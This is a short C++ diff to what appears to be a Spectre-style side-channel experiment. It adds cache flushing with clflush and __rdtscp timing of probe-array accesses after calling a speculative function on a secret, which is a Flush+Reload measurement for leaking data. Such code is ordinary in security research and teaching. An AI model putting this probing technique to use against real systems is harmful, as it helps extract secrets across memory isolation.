@@ -36,16 +36,29 @@ int addFive(int x){
 	return x+5;
 }
 
+inline void time(int i) {
+	unsigned int dummy;
+	auto t1 = __rdtscp(&dummy);
+	auto junk = array[i*256];
+	auto t2 = __rdtscp(&dummy);
+	cout<< i <<" "<<t2-t1<<endl;
+}
+
 int main(){
 	int x = 2;
 	int y = addFive(x);
-	speculative(&secret);
-	unsigned int dummy;
-	for(int i=0; i<256; i++){
-		auto t1 = __rdtscp(&dummy);
-		auto junk = array[i*256];
-		auto t2 = __rdtscp(&dummy);
-		cout<< i <<" "<<t2-t1<<endl;
+
+	for (int i = 0; i < 256; i++){
+		clflush(&array[i*256]);
 	}
+
+	speculative(&secret);
+	time(5);
+	time(63);
+	time(102);
+	time(112);
+	time(145);
+	time(204);
+	time(243);
 	return 0;
 }
